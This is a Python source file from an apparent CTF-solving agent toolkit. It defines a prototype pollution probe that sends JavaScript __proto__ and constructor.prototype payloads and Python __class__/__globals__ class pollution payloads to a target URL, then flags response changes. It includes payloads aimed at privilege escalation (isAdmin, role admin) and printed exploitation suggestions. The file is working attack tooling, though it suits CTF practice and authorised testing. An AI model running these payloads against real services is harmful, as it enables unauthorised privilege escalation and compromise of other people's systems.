"""Prototype / class pollution probe (split from misc_probe_tools.py)."""

import json
import re
from typing import List, Optional, Tuple

import requests

from ctf_solver.tools.core import parse_json_input


class PrototypePollutionTool:
    """
    PrototypePollutionTool: test for prototype pollution vulnerabilities.

    Tool interface (FAIR-style):
      - `name` and `description` class attributes.
      - `.use(tool_input: str) -> str`, where tool_input is JSON.

    Expected JSON tool_input format:

        {
          "url": "http://target.com/api/merge",
          "method": "POST",
          "param": null,
          "body": null,
          "content_type": "application/json",
          "timeout": 10
        }

    Tests for JavaScript prototype pollution and Python class pollution by
    sending payloads that attempt to set properties on Object.prototype.
    """

    name: str = "prototype_pollution_probe"
    description: str = (
        "Test for prototype pollution vulnerabilities (JavaScript and Python). "
        "Input must be JSON with 'url' (target endpoint). Optionally provide 'method' "
        "(default POST), 'param' (for query/form injection), 'body' (JSON body template), "
        "'content_type' (default application/json), and 'timeout' (default 10). "
        "Tests __proto__, constructor.prototype, and Python class pollution payloads, "
        "then compares responses to detect successful pollution."
    )
    parameters_schema = {
        "type": "object",
        "properties": {
            "url": {"type": "string"},
            "method": {
                "type": "string",
                "enum": ["GET", "POST", "PUT", "PATCH"],
                "default": "POST",
            },
            "param": {"type": "string"},
            "body": {"type": "object"},
            "content_type": {"type": "string", "default": "application/json"},
            "timeout": {"type": "integer", "default": 10},
        },
        "required": ["url"],
        "additionalProperties": False,
    }
    samples = [
        {"url": "http://example.com/api/merge", "method": "POST"},
    ]

    # JSON body pollution payloads: (payload_dict, description)
    JSON_PAYLOADS: List[Tuple[dict, str]] = [
        (
            {"__proto__": {"polluted": "true"}},
            "Basic __proto__ pollution",
        ),
        (
            {"constructor": {"prototype": {"polluted": "true"}}},
            "constructor.prototype pollution",
        ),
        (
            {"__proto__": {"isAdmin": True}},
            "__proto__ privilege escalation (isAdmin)",
        ),
        (
            {"__proto__": {"role": "admin"}},
            "__proto__ role injection",
        ),
        (
            {"__proto__": {"status": 200}},
            "__proto__ status override",
        ),
    ]

    # Query parameter pollution payloads: (param_string, description)
    QUERY_PAYLOADS: List[Tuple[str, str]] = [
        ("__proto__[polluted]=true", "Query param __proto__[polluted]"),
        ("__proto__.polluted=true", "Query param __proto__.polluted"),
        ("constructor[prototype][polluted]=true", "Query param constructor.prototype"),
    ]

    # Python class pollution payloads: (payload_dict, description)
    PYTHON_PAYLOADS: List[Tuple[dict, str]] = [
        (
            {"__class__": {"__qualname__": "test"}},
            "Python class attribute override",
        ),
        (
            {"__init__": {"__globals__": {"flag": "test"}}},
            "Python globals access via __init__",
        ),
    ]

    # Error patterns that suggest prototype pollution handling
    POLLUTION_ERROR_PATTERNS: List[str] = [
        r"__proto__",
        r"prototype",
        r"Object\.assign",
        r"merge",
        r"extend",
        r"lodash",
        r"deepmerge",
        r"deep[\-_]?copy",
    ]

    def __init__(self, session: Optional[requests.Session] = None) -> None:
        self.session = session or requests.Session()

    def use(self, tool_input: str) -> str:
        # Parse JSON input
        data, err = parse_json_input(tool_input, "PrototypePollutionTool")
        if err:
            return err
        url = data.get("url", "").strip() if isinstance(data.get("url"), str) else ""
        method = (data.get("method") or "POST").upper()
        param = data.get("param")
        body_template = data.get("body")
        content_type = data.get("content_type", "application/json")
        timeout = data.get("timeout", 10)

        if not url:
            return "[PrototypePollutionTool] Error: 'url' is required."
        if method not in ("GET", "POST", "PUT", "PATCH"):
            return f"[PrototypePollutionTool] Error: 'method' must be GET, POST, PUT, or PATCH, got '{method}'."

        # Get baseline response
        try:
            if "json" in content_type.lower():
                baseline_body = body_template if body_template else {"test": "baseline"}
                baseline_resp = self.session.request(
                    method,
                    url,
                    json=baseline_body,
                    headers={"Content-Type": content_type},
                    timeout=timeout,
                )
            else:
                baseline_resp = self.session.request(
                    method,
                    url,
                    data=body_template or {"test": "baseline"},
                    timeout=timeout,
                )
            baseline_status = baseline_resp.status_code
            baseline_length = len(baseline_resp.text)
            baseline_body_text = baseline_resp.text
        except Exception as exc:
            return f"[PrototypePollutionTool] Error getting baseline response: {exc}"

        findings = []
        error_indicators = []

        # Test JSON body payloads
        if "json" in content_type.lower():
            for payload_dict, description in self.JSON_PAYLOADS:
                # Merge payload with body template if provided
                if body_template and isinstance(body_template, dict):
                    merged = {**body_template, **payload_dict}
                else:
                    merged = payload_dict

                try:
                    resp = self.session.request(
                        method,
                        url,
                        json=merged,
                        headers={"Content-Type": content_type},
                        timeout=timeout,
                    )

                    changes = self._detect_changes(
                        baseline_status,
                        baseline_length,
                        baseline_body_text,
                        resp.status_code,
                        len(resp.text),
                        resp.text,
                    )
                    error_msgs = self._check_error_patterns(resp.text)

                    if changes or error_msgs:
                        finding = {
                            "type": "json_body",
                            "description": description,
                            "payload": json.dumps(payload_dict),
                            "status": resp.status_code,
                            "changes": changes,
                            "errors": error_msgs,
                        }
                        findings.append(finding)

                    if error_msgs:
                        error_indicators.extend(error_msgs)

                except Exception:
                    pass

            # Test Python class pollution payloads
            for payload_dict, description in self.PYTHON_PAYLOADS:
                if body_template and isinstance(body_template, dict):
                    merged = {**body_template, **payload_dict}
                else:
                    merged = payload_dict

                try:
                    resp = self.session.request(
                        method,
                        url,
                        json=merged,
                        headers={"Content-Type": content_type},
                        timeout=timeout,
                    )

                    changes = self._detect_changes(
                        baseline_status,
                        baseline_length,
                        baseline_body_text,
                        resp.status_code,
                        len(resp.text),
                        resp.text,
                    )
                    error_msgs = self._check_error_patterns(resp.text)

                    if changes or error_msgs:
                        finding = {
                            "type": "python_class",
                            "description": description,
                            "payload": json.dumps(payload_dict),
                            "status": resp.status_code,
                            "changes": changes,
                            "errors": error_msgs,
                        }
                        findings.append(finding)

                except Exception:
                    pass

        # Test query parameter payloads
        if param or method == "GET":
            for query_string, description in self.QUERY_PAYLOADS:
                try:
                    test_url = f"{url}{'&' if '?' in url else '?'}{query_string}"
                    resp = self.session.request(method, test_url, timeout=timeout)

                    changes = self._detect_changes(
                        baseline_status,
                        baseline_length,
                        baseline_body_text,
                        resp.status_code,
                        len(resp.text),
                        resp.text,
                    )
                    error_msgs = self._check_error_patterns(resp.text)

                    if changes or error_msgs:
                        finding = {
                            "type": "query_param",
                            "description": description,
                            "payload": query_string,
                            "status": resp.status_code,
                            "changes": changes,
                            "errors": error_msgs,
                        }
                        findings.append(finding)

                except Exception:
                    pass

        # Build output report
        output_lines = [
            "[PrototypePollutionTool] Prototype Pollution Probe Results",
            "=" * 58,
            f"Target: {url}",
            f"Method: {method}",
            f"Content-Type: {content_type}",
            f"Baseline Status: {baseline_status}",
            f"Baseline Length: {baseline_length} bytes",
            "",
        ]

        if findings:
            output_lines.append(f"POTENTIAL FINDINGS ({len(findings)}):")
            output_lines.append("-" * 40)
            for finding in findings:
                output_lines.append(
                    f"  [{finding['type'].upper()}] {finding['description']}"
                )
                output_lines.append(f"    Payload: {finding['payload']}")
                output_lines.append(f"    Status: {finding['status']}")
                if finding["changes"]:
                    for change in finding["changes"]:
                        output_lines.append(f"    -> {change}")
                if finding["errors"]:
                    for err in finding["errors"]:
                        output_lines.append(f"    -> Error indicator: {err}")
                output_lines.append("")
        else:
            output_lines.append("No prototype pollution indicators detected.")
            output_lines.append("")

        # Summary and exploitation suggestions
        output_lines.append("RECOMMENDATIONS:")
        if findings:
            output_lines.append("  [!] Potential prototype pollution detected!")
            output_lines.append(
                "  - Try __proto__.isAdmin = true for privilege escalation"
            )
            output_lines.append("  - Try __proto__.role = 'admin' for role injection")
            output_lines.append(
                "  - Try __proto__.constructor to modify object behavior"
            )
            output_lines.append(
                "  - Check if server uses lodash.merge(), Object.assign(), or similar"
            )
            output_lines.append(
                "  - For Python: try __class__.__init__.__globals__ traversal"
            )
        else:
            output_lines.append("  - No pollution detected with standard payloads.")
            output_lines.append('  - Try nested JSON: {"a": {"__proto__": {"b": 1}}}')
            output_lines.append("  - Try different content types or request methods.")
            output_lines.append(
                "  - Check if the application uses deep merge libraries."
            )

        return "\n".join(output_lines)

    def _detect_changes(
        self,
        baseline_status: int,
        baseline_length: int,
        baseline_body: str,
        resp_status: int,
        resp_length: int,
        resp_body: str,
    ) -> List[str]:
        """Detect differences between baseline and test response."""
        changes = []

        if resp_status != baseline_status:
            changes.append(f"Status changed: {baseline_status} -> {resp_status}")

        length_diff = abs(resp_length - baseline_length)
        if length_diff > 50:
            changes.append(
                f"Length changed: {baseline_length} -> {resp_length} (diff: {length_diff})"
            )

        if resp_body != baseline_body and not changes:
            # Body changed but length similar - content difference
            if resp_body[:200] != baseline_body[:200]:
                changes.append("Response body content changed")

        return changes

    def _check_error_patterns(self, text: str) -> List[str]:
        """Check response for prototype pollution related error messages."""
        found = []
        for pattern in self.POLLUTION_ERROR_PATTERNS:
            if re.search(pattern, text, re.IGNORECASE):
                found.append(pattern)
        return found
